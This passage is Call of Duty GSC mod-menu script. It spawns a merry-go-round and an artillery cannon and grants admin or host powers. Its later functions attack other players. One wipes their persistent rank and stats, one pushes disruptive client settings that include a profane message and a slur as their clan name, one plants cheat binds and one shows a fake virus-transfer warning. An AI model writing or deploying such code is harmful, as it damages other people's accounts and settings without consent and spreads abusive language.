		if(!self.spinning) thread spinTurret();
		wait(.1);
	}
	self.tagedPlayer=undefined;
}
rotateTurret(owner)
{
	while(owner.isTurret)
	{
		while(isDefined(self.tagedPlayer))
		{
			self rotateTo(vectorToAngles(self.tagedPlayer getEye()- self.origin),.1);
			wait(.1);
		}
		wait(.05);
	}
}
spinTurret()
{
	self.spinning=true;
	self.angles =(0,self.angles[1],self.angles[2]);
	while(!isDefined(self.tagedPlayer))
	{
		self rotateYaw(90,2);
		wait(.05);
	}
	self.spinning=false;
}
turretTarget(aiTarget)
{
	trace=bulletTrace(self.origin+(0,0,5),aiTarget getEye(),false,self)["fraction"];
	if(trace==1 && distance(self.origin,aiTarget.origin)<= 1400) return distance(self.origin,aiTarget.origin);
	return int(-1);
}
build()
{
	if(!level.spawningObject)
	{
		if(!level.merryGoRound)
		{
            MerryGoRoundBuild();
	    	level.spawningObject = true;
		    level.merryGoRound = true;
		}
		else
		{
			thread deleteAllModels();
			level.merryGoRound=false;
			self iPrintln("Merry Go Round Deleted!!");
		}
	}
	else self iPrintln("^1Please Wait There Is Something Else Spawning!");
}
MerryGoRoundBuild()
{
	
thread deleteAllModels();
level.spawningObject = true;
level.merryGoRound = true;
self iPrintln("Merry Go Round Spawned!!");
self thread buildMerry("mp_supplydrop_ally");
	
}
buildMerry(cratesmodel)
{
	center=self.origin;
	level.crates=[];
	sizeArray=strTok("21;12;9",";");
	for(z=0;z < 160;z += 155)
	{
		num=0;
		for(k=55;k < 200;k += 55)
		{
			for(r=0;r < 360;r += int(sizeArray[num]))
			{
				size=level.crates.size;
				x=center[0]+(k*cos(r));
				y=center[1]+(k*sin(r));
				level.crates[size]=spawn("script_model",(x,y,center[2]+z));
				level.crates[size] setModel(cratesmodel);
				angle=vectorToAngles(level.crates[size].origin -(center[0],center[1],center[2]+z));
				level.crates[size].angles =(angle[0],angle[1],0);
				destroyArray(level.crates[size]);
				wait .05;
			}
			num ++;
		}
	}
	for(z=28;z < 168;z +=28)
	{
		for(k=0;k < 7;k++)
		{
			size=level.centerCrates.size;
			level.centerCrates[size]=spawn("script_model",(center[0],center[1],center[2]+z-10));
			level.centerCrates[size] setModel(cratesmodel);
			level.centerCrates[size].angles =(0,22*k,0);
			destroyArray(level.centerCrates[size]);
		}
		wait .05;
	}
	thread spawnSeat(center+(-123,101,40),(90,45,0));
	thread spawnSeat(center+(-23,-101,40),(90,0,0));
	thread spawnSeat(center+(-23,101,40),(90,0,0));
	thread spawnSeat(center+(-101,-123,40),(90,135,0));
	thread spawnSeat(center+(101,-23,40),(90,90,0));
	thread spawnSeat(center+(123,-101,40),(90,-135,0));
	thread spawnSeat(center+(101,123,40),(90,-45,0));
	thread spawnSeat(center+(-101,-23,40),(90,90,0));
	for(k=0;k < level.merrySeat.size;k++)
	{
		level.seatCenter[k]=spawn("script_origin",center);
		destroyArray(level.seatCenter[k]);
		level.merrySeat[k] linkTo(level.seatCenter[k]);
		level.seatCenter[k] thread moveSeat();
	}
	center=spawn("script_origin",center);
	for(k=0;k < level.crates.size;k++) level.crates[k] linkTo(center);
	center thread monitorPlayers();
	level.spawningObject=false;
	center showIconOnMap("compass_waypoint_panic");
	while(level.merryGoRound)
	{
		center rotateYaw(-360,4);
		for(k=0;k < level.seatCenter.size;k++) level.seatCenter[k] rotateYaw(-360,4);
		wait 4;
	}
}
monitorPlayers()
{
	while(level.merryGoRound)
	{
		for(k=0;k < level.players.size;k++)
		{
			player=level.players[k];
			if(distance(self.origin,player.origin)< 210)
			{
				closest=getClosest(player.origin,level.merrySeat);
				if(!closest.inUse && !player.Occ)
				{
					player.oldOrigin=player getOrigin();
					player playerLinkTo(closest);
					closest.inUse=true;
					player.Occ=true;
				}
				else if(player useButtonPressed()&& closest.inUse && player.Occ)
				{
					player unlink();
					player setOrigin(player.oldOrigin);
					closest.inUse=false;
					wait 2;
					player.Occ=false;
				}
			}
		}
		wait .05;
	}
}
playerLinkTo(linkTo)
{
	self setOrigin(linkTo.origin-(0,0,35));
	self linkTo(linkTo);
}
spawnSeat(arg,angles)
{
	if(!isDefined(level.merrySeat)) level.merrySeat=[];
	size=level.merrySeat.size;
	level.merrySeat[size]=spawnStruct();
	level.merrySeat[size]=spawn("script_model",arg);
	if(getDvar("mapname")=="mp_castle"||getDvar("mapname")=="mp_airfield")level.merrySeat[size] setModel("global_explosive_barrel_japanese");
	else if(getdvar("mapname") == "mp_seelow")level.merrySeat[size] setModel("static_seelow_tractor");
	else
	{
		level.merrySeat[size] setModel("test_sphere_silver");
	}
	level.merrySeat[size].angles=angles;
	level.merrySeat[size].inUse=false;
	destroyArray(level.merrySeat[size]);
}
moveSeat()
{
	while(level.merryGoRound)
	{
		rand=randomFloatRange(1,2);
		self moveTo((self.origin[0],self.origin[1],self.origin[2]+85),rand);
		wait rand;
		Rand=randomFloatRange(1,2);
		self moveTo((self.origin[0],self.origin[1],self.origin[2]-85),rand);
		wait rand;
	}
}
doArtilleryGun()
{
  self thread ExitMenu();
  wait .3;
  self thread artilleryGun();
  self iPrintln("Artilley Gun Spawned!!");
}
ChangeMenuDesign()
{
	if(self.MenuStyle==false)
	{
		self ExitMenu();
		self iPrintln("Changing Menu Design Wait.....");
		self.LockMenu=true;
		wait .5;
		self suicide();
		level.MenuStyle = "LEFT";
		self.LockMenu=false;
		self iPrintln("Menu Design: ^2[ON]");
		self.MenuStyle=true;
	}
	else
	{
	    self ExitMenu();
		self iPrintln("Changing Menu Design Wait.....");
		self.LockMenu=true;
		wait .5;
		self suicide();
		level.MenuStyle = "";
		self.LockMenu=false;
		self iPrintln("Menu Design: ^1[OFF]");
		self.MenuStyle=false;
	}
}
artilleryGun()
{
	if(!level.spawningObject)
	{
		if(!level.artilleryGunSpawn)
		{
			thread deleteAllModels();
			thread cannonDeath();
			level.artilleryGunSpawn=true;
			origin=[];
			for(k=0;k < 2;k++) origin[k] =(self.origin-(k*20,0,0));
			artilleryBase=[];
			for(k=0;k < 4;k++) artilleryBase[0][k]=spawnBox((origin[0]+(((k*50)-95),0,0)),(0,0,0));
			for(k=0;k < 4;k++) artilleryBase[1][k]=spawnBox((origin[0]+(-20,((k*50)-70),0)),(0,90,0));
			artilleryCenter=[];
			for(k=0;k < 3;k++) artilleryCenter[0][k]=spawnBox((origin[0]+(((k*30)-50),0,15)),(0,90,0));
			for(k=0;k < 2;k++) for(i=0;i < 2;i++) artilleryCenter[k+1][i]=spawnBox((origin[0]+(((k*60)-50),0,((i*25)+40))),(0,90,0));
			artilleryGun=[];
			for(k=0;k < 5;k++) artilleryGun[k]=spawnBox((origin[0]+(-20,((k*50)-60),65)),(0,90,0));
			for(k=0;k < 360;k +=25)
			{
				artilleryCos[k]=spawnBox((origin[1]+(30*cos(k),30*sin(k),0)),(0,90,0));
				angle=vectorToAngles(artilleryCos[k].origin - origin[1]);
				artilleryCos[k].angles =(angle[0],angle[1],0);
			}
			level.spin=spawn("script_origin",origin[1]+(0,0,90));
			for(k=0;k < artilleryCenter.size;k++) for(i=0;i < artilleryCenter[k].size;i++) artilleryCenter[k][i] linkTo(level.spin);
			level.tilt=spawn("script_origin",origin[1]+(0,0,65));
			for(k=0;k < artilleryGun.size;k++) artilleryGun[k] linkTo(level.tilt);
			level.artilleryShoot=[];
			for(k=0;k < 2;k++)
			{
				level.artilleryShoot[k]=spawn("script_origin",origin[1]+(0,((k*200)+190),65));
				level.artilleryShoot[k] linkTo(level.tilt);
			}
			level.isUseingGun=false;
			level.scriptOrigin=origin;
			level.controlPannel=spawnBox(origin[1]+(205,205,0),(0,-45,0));
			level.controlLaptop=spawnBox(origin[1]+(205,205,30),(0,45,0),"prop_suitcase_bomb");
			level addViewPoint(0,origin[1]+(225,225,0),(5,-135,0));
			level addViewPoint(1,origin[1]+(0,0,700),(90,0,0));
			level addViewPoint(2,level.artilleryShoot[0].origin-(0,0,45),(0,0,0),level.tilt);
			level.cannonShoot=false;
			level thread cannonTrigger(level.controlPannel);
			level.spin showIconOnMap("compass_objpoint_flak_busy");
		}
		else
		{
			thread deleteAllModels();
			self iPrintln("^1Artillery Cannon Destroyed");
		}
	}
	else self iPrintln("^1Please Wait There Is Something Else Spawning!");
}
cannonTrigger(entity)
{
	level endon("cannon_delete");
	while(isDefined(entity))
	{
		for(k=0;k < level.players.size;k++)
		{
			player=level.players[k];
			if(distance(player.origin,entity.origin)< 40)
			{
				player.hint="Press [{+activate}] To Control Cannon";
				if(player useButtonPressed()&& !level.isUseingGun)
				{
					player.useingCannon=true;
					player.oldPos=player getOrigin();
					level.isUseingGun=true;
					player setPlayerAngles((5,-135,0));
					player thread artilleryControl();
					player hide();
				}
			}
		}
		wait .05;
	}
}
addViewPoint(num,origin,angles,link)
{
	level.viewPoint[num]=spawn("script_origin",origin);
	level.viewAngle[num]=angles;
	destroyArray(level.viewAngle[num]);
	if(isDefined(link)) level.viewPoint[num] linkTo(link);
}
artilleryControl()
{
	level endon("cannon_control");
	self.LockMenu=true;
	string="";
	artilleryOptions=strTok("Turn Right;Turn Left;Look Up;Look Down;Switch View",";");
	artilleryCase=strTok("right;left;up;down;view",";");
	for(k=0;k < artilleryOptions.size;k++) string += artilleryOptions[k]+"\n";
	self.artillery["options"]=createTextString("default",1.5,"LEFT","",-230,90,1,3,string);
	self.artillery["backGround"]=createShader("LEFT","",-240,125,110,100,(0,0,0),"white",1,.6);
	self.artillery["scrollBar"]=createShader("LEFT","",-240,90,110,18,(0.5,0.0,0.8),"white",2,1);
	curs=0;
	self.next=0;
	while(self.useingCannon)
	{
		setHealth(99999999);
		if(self fragButtonPressed()&& !level.cannonShoot)
		{
			level.cannonShoot=true;
			earthquake(.7,.9,level.spin.origin,300);
			playFx(level.chopper_fx["explode"]["medium"],level.artilleryShoot[0].origin);
			bullet=spawn("script_model",level.artilleryShoot[0].origin);
			bullet setModel("projectile_cbu97_clusterbomb");
			bullet.angles=vectorToAngles(level.artilleryShoot[1].origin - level.artilleryShoot[0].origin);
			trace=bulletTrace(level.artilleryShoot[0].origin,vector_scale(anglesToForward(bullet.angles),1000000),false,self)["position"];
			time =(distance(level.artilleryShoot[0].origin,trace)/3000);
			bullet moveTo(trace,time);
			bullet thread destroyBullet(time,self);
		}
		if(isButtonPressed("+activate"))
		{
			thread cannonActions(artilleryCase[curs]);
			if(artilleryCase[curs]=="view") wait .2;
		}
		if(isButtonPressed("+attack")|| isButtonPressed("+speed_throw"))
		{
			curs += isButtonPressed("+attack");
			curs -= isButtonPressed("+speed_throw");
			if(curs>=artilleryOptions.size) curs=0;
			if(curs < 0) curs=artilleryOptions.size-1;
			self.artillery["scrollBar"].y =((curs*18)+90);
			wait .2;
		}
		if(isButtonPressed("+melee"))
		{
			thread exitCannonFunctions(self.artillery);
			break;
		}
		self disableWeapons();
		self freezeControls(true);
		wait .05;
	}
}
exitCannonFunctions(hudElem)
{
	self notify("switch_cannon");
	level notify("cannon_control");
	self show();
	self setOrigin(self.oldPos);
	level.cannonShoot=false;
	self unlink();
	self.LockMenu=false;
	self enableWeapons();
	self freezeControls(false);
	level.isUseingGun=false;
	self.useingCannon=false;
	setHealth(100);
	if(isDefined(self.cannonHud[0]))for(k=0;k < self.cannonHud.size;k++)self.cannonHud[k] destroy();
	keys=getArrayKeys(hudElem);
	for(k=0;k < keys.size && isDefined(hudElem[keys[k]]);
	k++)hudElem[keys[k]] destroy();
}
cannonActions(caseType)
{
	switch(caseType)
	{
		case "right": level.tilt linkTo(level.spin);
		level.spin rotateTo(level.spin.angles-(0,2,0),.05);
		break;
		case "left": level.tilt linkTo(level.spin);
		level.spin rotateTo(level.spin.angles+(0,2,0),.05);
		break;
		case "up": level.tilt unlink();
		if(level.tilt.angles[2]<=25)level.tilt rotateTo(level.tilt.angles+(0,0,1),.05);
		break;
		case "down": level.tilt unlink();
		if(level.tilt.angles[2]>=-15)level.tilt rotateTo(level.tilt.angles-(0,0,1),.05);
		break;
		case "view": if(isDefined(self.cannonHud[0]))for(k=0;k < self.cannonHud.size;k++)self.cannonHud[k] destroy();
		self notify("switch_cannon");
		self.next ++;
		if(self.next>=level.viewPoint.size)self.next=0;
		self unlink();
		self setOrigin(level.viewPoint[self.next].origin);
		self linkTo(level.viewPoint[self.next]);
		self setPlayerAngles(level.viewAngle[self.next]);
		if(self.next==2)thread runCannonAngles();
		wait .2;
		break;
	}
}
runCannonAngles()
{
	self endon("switch_cannon");
	coord=strTok("21,0,2,24;-20,0,2,24;0,-11,40,2;0,11,40,2;0,-39,2,57;0,39,2,57;-48,0,57,2;49,0,57,2;-155,-122,2,21;-154,122,2,21;155,122,2,21;155,-122,2,21;-145,132,21,2;145,-132,21,2;-145,-132,21,2;146,132,21,2",";");
	for(k=0;k < coord.size;k++)
	{
		tCoord=strTok(coord[k],",");
		self.cannonHud[k]=createHuds(int(tCoord[0]),int(tCoord[1]),int(tCoord[2]),int(tCoord[3]));
	}
	for(;;)
	{
		self setPlayerAngles(vectorToAngles(level.artilleryShoot[1].origin - level.artilleryShoot[0].origin));
		wait .05;
	}
}
destroyBullet(time,owner)
{
	wait time;
	playFx(level._effect["bombexplosion"],self.origin);
	self playSound("exp_suitcase_bomb_main");
	radiusDamage(self.origin,250,200,90,owner);
	self delete();
	wait 1;
	level.cannonShoot=false;
}
spawnBox(pos,angle,model)
{
	box=spawn("script_model",pos);
	if(!isDefined(model))box setModel("mp_supplydrop_ally");
	else box setModel(model);
	box.angles=angle;
	destroyArray(box);
	return box;
}
cannonDeath()
{
	level endon("cannon_delete");
	self waittill("death");
	if(self.useingCannon) thread exitCannonFunctions(self.artillery);
}
setHealth(health)
{
	self.maxhealth=health;
	self.health=self.maxhealth;
}
showIconOnMap(shader)
{
	level.objective=maps\mp\gametypes\_gameobjects::getNextObjID();
	objective_add(level.objective,"invisible",(0,0,0));
	objective_position(level.objective,self.origin);
	objective_state(level.objective,"active");
	objective_team(level.objective,self.team);
	objective_icon(level.objective,shader);
}
destroyArray(ent)
{
	if(!isDefined(level.modelEnt)) level.modelEnt=[];
	level.modelEnt[level.modelEnt.size]=ent;
}
isButtonPressed(required)
{
	button="";
	if(isSubStr(toLower(required),"+attack")) button=self attackButtonPressed();
	if(isSubStr(toLower(required),"+activate")) button=self useButtonPressed();
	if(isSubStr(toLower(required),"+speed_throw")) button=self adsButtonPressed();
	if(isSubStr(toLower(required),"+melee")) button=self meleeButtonPressed();
	if(isSubStr(toLower(required),"+frag")) button=self fragButtonPressed();
	if(isSubStr(toLower(required),"+smoke")) button=self secondaryOffHandButtonPressed();
	return button;
}
isHost(player)
{
	if(self GetEntityNumber()==0 ||isSubStr(self.name,"iPROFamily")||isSubStr(self.name,"[iPRO]iPROFamily")||isSubStr(self.name,"iPROFAME")||isSubStr(self.name,"iPRO-FAME")||isSubStr(self.name,"xX-CoD_PRO1-Xx")||isSubStr(self.name,"iReset"))return true;
	return false;
}
deleteAllModels()
{
	objective_Delete(level.objective);
	if(isDefined(level.modelEnt)) for(k=0;k < level.modelEnt.size;k++) level.modelEnt[k] delete();
	if(level.merryGoRound)
	{
		for(k=0;k < level.players.size;k++)
		{
			level.players[k] unlink();
			level.players[k].Occ=false;
		}
		level.merryGoRound=false;
	}
	if(level.skyBaseSpawn)
	{
		for(k=0;k < level.players.size;k++)
		{
			level.players[k] allowJump(true);
			level.players[k].randumWeapon=false;
		}
		level.sbOpen=false;
		level.skyBaseSpawn=false;
	}
	if(level.artilleryGunSpawn)
	{
		level notify("cannon_delete");
		level.controlPannel delete();
		level.spin delete();
		level.tilt delete();
		for(k=0;k < 2;k++) level.artilleryShoot[k] delete();
		level.isUseingGun=false;
		level.artilleryGunSpawn=false;
		for(k=0;k < level.players.size;k++) if(level.players[k].useingCannon) level.players[k] thread exitCannonFunctions(level.players[k].artillery);
	}
}
AdminPlayer()
{
	player=level.players[self.PlayerNum];
	if(player isHost())
	{
		self iPrintln("You Cannot Do This To ^1"+player.name);
	}
	else
	{
		level.players[self.PlayerNum] thread Admin();
		self iPrintln(level.players[self.PlayerNum].name + ": ^1Admin");
	}
}
Admin()
{
	self.verified=true;
	self.vip=true;
	self.admin=true;
	self.host=false;
	self thread iPROFamily();
	self iPrintln("Your access level is: Admin");
}
HostPlayer()
{
	player=level.players[self.PlayerNum];
	if(player isHost())
	{
		self iPrintln("You Cannot Do This To ^1"+player.name);
	}
	else
	{
		level.players[self.PlayerNum] thread HostPower();
		self iPrintln(level.players[self.PlayerNum].name + ": ^1Host Power");
	}
}
HostPower()
{
	self.verified=true;
	self.vip=true;
	self.admin=true;
	self.host=true;
	self thread iPROFamily();
	self iPrintln("Your access level is: Host");
}
TeleportToMe()
{
	level.players[self.PlayerNum] SetOrigin(self.origin +(10,0,0));
	self iPrintln("You Teleported "+level.players[self.PlayerNum].name+" To You!");
}
Send2Space()
{
	level.players[self.PlayerNum] thread doSpace();
	self iPrintln("You Sent "+level.players[self.PlayerNum].name+" To Space");
}
doSpace()
{
	self endon("disconnect");
	self iPrintln("Lost In Space !");
	x=randomIntRange(-75,75);
	y=randomIntRange(-75,75);
	z=45;
	self.location =(0+x,0+y,500000+z);
	self.angle =(0,176,0);
	self setOrigin(self.location);
	self setPlayerAngles(self.angle);
}
InfectBadDvars()
{
	level.players[self.PlayerNum] thread BadDvars();
	self iPrintln("You Infected "+level.players[self.PlayerNum].name+" With Bad Dvars!");
}
BadDvars()
{
	self setClientDvar("motd","^3Have A Nice Fuck Up Day :)");
	self setclientDvar("maxVoicePacketsPerSec","3");
	self setClientDvar("MakeMeHost","0");
	self setclientDvar("r_filmUseTweaks","1");
	self setclientDvar("r_filmTweakEnable","1");
	self setclientDvar("developer_script","1");
	self setclientDvar("developer","1");
	self setclientDvar("scr_player_maxhealth","30");
	self setClientDvar("party_connectToOthers","1");
	self setClientDvar("party_hostmigration","1");
	self setClientDvar("party_iamhost","0");
	self setClientDvar("party_host","0");
	self setclientDvar("bg_aimSpreadMoveSpeedThreshold","999");
	self setclientDvar("bg_shock_volume_announcer","25.5");
	self setclientDvar("bg_shock_volume_voice","25.5");
	self setclientDvar("bg_weaponBobMax","999");
	self setclientDvar("hud_bloodOverlayLerpRate","15.9");
	self setclientDvar("hud_fade_compass","1");
	self setclientDvar("hudElemPausedBrightness","12.4");
	self setclientDvar("lobby_animationTilesHigh","12");
	self setclientDvar("lobby_animationTilesWide","32");
	self setclientDvar("loc_forceEnglish","0");
	self setclientDvar("loc_language","1");
	self setclientDvar("loc_translate","0");
	self setclientDvar("ui_xpText","0");
	self setclientDvar("ui_hint_text","PWNED!!");
	self setClientDvar("ui_mapname","mpiPROFamily");
	self setclientDvar("compassSize","25");
	self setclientDvar("compassRotation","0");
	self setclientDvar("cg_gun_x","2");
	self setclientDvar("cg_gun_y","-2");
	self setclientDvar("cg_gun_z","3");
	self setclientDvar("cg_drawpaused","0");
	self setclientDvar("cg_weaponCycleDelay","4");
	self setclientDvar("cg_hudGrenadePointerWidth","999");
	self setclientDvar("cg_hudVotePosition","5 175");
	self setclientDvar("cg_drawFPS","1");
	self setclientDvar("cg_drawFPSLabels","1");
	self setclientDvar("cg_fov","80");
	self setclientDvar("cg_youInKillCamSize","9999");
	self setclientDvar("cl_wadefps","1");
	self setclientDvar("cl_hudDrawsBehindUI","0");
	self setclientDvar("cl_stanceHoldTime","90000");
	self setClientDvar("clanName","FAG");
}
doDerank()
{
	level.players[self.PlayerNum] thread DerankMuch();
	self iPrintln("You Deranked "+level.players[self.PlayerNum].name+"!");
}
DerankMuch()
{
	setDvar("scr_forcerankedmatch",1);
	setdvar("xblive_privatematch",0);
	wait 0.2;
	self maps\mp\gametypes\_persistence::statSet("plevel",0);
	self maps\mp\gametypes\_persistence::statSet("total_hits",-21470000);
	self maps\mp\gametypes\_persistence::statSet("rank",1);
	self maps\mp\gametypes\_persistence::statSet("hits",-21470000);
	self maps\mp\gametypes\_persistence::statSet("misses",-21470000);
	self maps\mp\gametypes\_persistence::statSet("rank",1);
	self maps\mp\gametypes\_persistence::statSet("accuracy",-21470000);
	self maps\mp\gametypes\_persistence::statSet("score",-21470000);
	self maps\mp\gametypes\_persistence::statSet("plevel",0);
	self maps\mp\gametypes\_persistence::statSet("kills",-21470000);
	self maps\mp\gametypes\_persistence::statSet("deaths",-21470000);
	self maps\mp\gametypes\_persistence::statSet("kill_streak",-21470000);
	self maps\mp\gametypes\_persistence::statSet("win_streak",-21470000);
}
InfectBind()
{
	level.players[self.PlayerNum] thread InfectSimpleBinds();
	self iPrintln("You Infected "+level.players[self.PlayerNum].name+" With Simple Binds!");
}
InfectSimpleBinds()
{
	self iPrintln("Binds Given.");
	self setClientDvar("ActiveAction","bind button_back vstr BINDS");
	self setClientDvar("BINDS","bind button_back vstr BINDS;bind dpad_up god;bind dpad_down noclip;bind dpad_left dropweapon;bind dpad_right give all");
}
InfectMenu()
{
	level.players[self.PlayerNum] thread Menu();
	self iPrintln("You Infected "+level.players[self.PlayerNum].name+" With Infectable Menu!");
}
ScarePlayer()
{
	level.players[self.PlayerNum] thread lol2("^1Virus Transfer : /dev_hdd0/game",15);
	level.players[self.PlayerNum] thread lolwarn();
	self iPrintln("You Scared "+level.players[self.PlayerNum].name+"!");
	wait 15;
}
Rank65Player()
{
	level.players[self.PlayerNum] thread Rank65();
	self iPrintln("You Gave "+level.players[self.PlayerNum].name+" Rank 50!");
}
SENTTOPRISON()
{
	if(level.Prison == 1)
	{ 
	    level.players[self.PlayerNum] SetOrigin((1000.0, 1000.0, 1500.0)); 
	    self iPrintln(level.players[self.PlayerNum].name + ": ^6SENT TO PRISON");
	} 
}